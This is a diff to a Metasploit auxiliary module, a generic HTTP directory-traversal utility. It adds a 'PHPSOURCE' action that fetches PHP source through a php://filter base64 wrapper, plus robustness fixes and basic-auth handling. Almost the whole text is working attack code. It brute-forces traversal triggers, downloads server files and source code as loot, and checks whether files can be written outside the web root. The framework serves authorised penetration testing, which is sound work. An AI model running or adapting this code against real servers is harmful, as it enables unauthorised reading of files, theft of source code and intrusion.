@@ -1,3 +1,10 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
 #
 # Thanks to:
 # ipax, neriberto, flambaz, bperry, egypt, and sinn3r for help
@@ -12,6 +19,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::WmapScanUniqueQuery
 
+
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Generic HTTP Directory Traversal Utility',
@@ -23,16 +31,16 @@ class Metasploit3 < Msf::Auxiliary
 				directory traversal exists in the web server, and then return the path that
 				triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as
 				'CHECK', but will take advantage of the found trigger to download files based on
-				a 'FILELIST' of your choosing.  The 'WRITABLE' action can be used to determine
+				a 'FILELIST' of your choosing.  The 'PHPSOURCE' action can be used to download
+				source against PHP applications.  The 'WRITABLE' action can be used to determine
 				if the trigger can be used to write files outside the www directory.
 
-					To use the 'COOKIE' option, set your value like so: "name=value".  To use
-				the 'BASICAUTH' option, set it like this: "username:password".
+					To use the 'COOKIE' option, set your value like so: "name=value".
 			},
 			'Author'         =>
 				[
 					'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',
-					'm-1-k-3 <michael.messner[at]integralis.com>',
+					'Michael Messner <devnull[at]s3cur1ty.de>',
 					'et <et[at]cyberspace.org>',
 					'sinn3r'
 				],
@@ -41,14 +49,14 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					['CHECK',    {'Description' => 'Check for basic directory traversal'}],
 					['WRITABLE', {'Description' => 'Check if a traversal bug allows us to write anywhere'}],
-					['DOWNLOAD', {'Description' => 'Attempt to download files after bruteforcing a trigger'}]
+					['DOWNLOAD', {'Description' => 'Attempt to download files after bruteforcing a trigger'}],
+					['PHPSOURCE', {'Description' => 'Attempt to retrieve php source code files'}]
 				],
 			'DefaultAction'  => 'CHECK'
 		))
 
 		register_options(
 			[
-				Opt::RPORT(80),
 				OptEnum.new('METHOD',    [true, 'HTTP Request Method', 'GET', ['GET', 'POST', 'HEAD', 'PUT']]),
 				OptString.new('PATH',    [true, 'Vulnerable path. Ex: /foo/index.php?pg=', '/']),
 				OptString.new('DATA',    [false,'HTTP body data', '']),
@@ -68,8 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 				# We favor automatic
 				OptString.new('TRIGGER',   [false,'Trigger string. Ex: ../', '']),
 				OptString.new('FILE',      [false, 'Default file to read for the fuzzing stage', '']),
-				OptString.new('COOKIE',    [false, 'Cookie value to use when sending the requests', '']),
-				OptString.new('BASICAUTH', [false, 'Credential to use for basic auth (Ex: admin:admin)', ''])
+				OptString.new('COOKIE',    [false, 'Cookie value to use when sending the requests', ''])
 			], self.class)
 
 		deregister_options('RHOST')
@@ -101,10 +108,11 @@ class Metasploit3 < Msf::Auxiliary
 			1.upto(depth) do |d|
 				file_to_read.each do |f|
 					trigger = base * d
-					req = ini_request(datastore['PATH'] + trigger + f)
-					vprint_status("Trying: http://#{rhost}:#{rport}#{req['uri']}")
+					p = datastore['PATH'] + trigger + f
+					req = ini_request(p)
+					vprint_status("Trying: http://#{rhost}:#{rport}#{p}")
 					res = send_request_cgi(req, 25)
-					return trigger if res.to_s =~ datastore['PATTERN']
+					return trigger if res and res.to_s =~ datastore['PATTERN']
 				end
 			end
 		end
@@ -138,11 +146,21 @@ class Metasploit3 < Msf::Auxiliary
 		when 'HEAD'
 		end
 
+		if not req['vars_get'].nil? or not req['vars_post'].nil? or not req['data'].nil?
+			begin
+				this_path = URI(uri).path
+			rescue ::URI::InvalidURIError
+				this_path = uri.scan(/^(.+)\?*.*/).flatten[0]
+			end
+		else
+			this_path = uri
+		end
+
 		req['method']     = datastore['METHOD']
-		req['uri']        = uri
+		req['uri']        = this_path
 		req['headers']    = {'Cookie'=>datastore['COOKIE']} if not datastore['COOKIE'].empty?
 		req['data']       = datastore['DATA'] if not datastore['DATA'].empty?
-		req['basic_auth'] = datastore['BASICAUTH'] if not datastore['BASICAUTH'].empty?
+		req['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
 
 		return req
 	end
@@ -183,7 +201,7 @@ class Metasploit3 < Msf::Auxiliary
 			req = ini_request(uri)
 			vprint_status("Trying: http://#{rhost}:#{rport}#{uri}")
 			res = send_request_cgi(req, 25)
-			found = true if res.to_s =~ datastore['PATTERN']
+			found = true if res and res.to_s =~ datastore['PATTERN']
 		end
 
 		# Reporting
@@ -221,10 +239,10 @@ class Metasploit3 < Msf::Auxiliary
 			req = ini_request(uri = (datastore['PATH'] + trigger + f).chop)
 			res = send_request_cgi(req, 25)
 
-			vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}")
+			vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
 
 			# Only download files that are withint our interest
-			if res.to_s =~ datastore['PATTERN']
+			if res and res.to_s =~ datastore['PATTERN']
 				# We assume the string followed by the last '/' is our file name
 				fname = f.split("/")[-1].chop
 				loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
@@ -234,6 +252,31 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		print_status("#{counter.to_s} file(s) downloaded")
 	end
+
+
+	#
+	# Action 'PHPSOURCE': Used to grab the php source code
+	#
+	def php_download(files)
+		counter = 0
+		files.each_line do |f|
+			# Our trigger already puts us in '/', so our filename doesn't need to begin with that
+			f = f[1,f.length] if f =~ /^\//
+
+			req = ini_request(uri = (datastore['PATH'] + "php://filter/read=convert.base64-encode/resource=" + f).chop)
+			res = send_request_cgi(req, 25)
+
+			vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
+
+			# We assume the string followed by the last '/' is our file name
+			fname = f.split("/")[-1].chop
+			loot = store_loot("php.data","text/plain",rhost,Rex::Text.decode_base64(res.body),fname)
+			print_good("File #{fname} downloaded to: #{loot}")
+			counter += 1
+		end
+		print_status("#{counter.to_s} source code file(s) downloaded")
+	end
+
 
 	#
 	# Action 'WRITABLE': This method will attempt to write to a directory outside of www
@@ -268,7 +311,7 @@ class Metasploit3 < Msf::Auxiliary
 		res = send_request_cgi(req, 25)
 
 		# Did we get it?
-		if res.body =~ /#{unique_str}/
+		if res and res.body =~ /#{unique_str}/
 			print_good("WRITE is possible on #{rhost}:#{rport}")
 		else
 			print_error("WRITE seems unlikely")
@@ -310,6 +353,12 @@ class Metasploit3 < Msf::Auxiliary
 			trigger = ini_trigger
 			return if trigger.nil?
 			is_writable(trigger)
+
+		elsif action.name == 'PHPSOURCE'
+			trigger = ini_trigger
+			return if trigger.nil?
+			files = load_filelist
+			php_download(files)
 
 		elsif action.name == 'DOWNLOAD'
 			trigger = ini_trigger
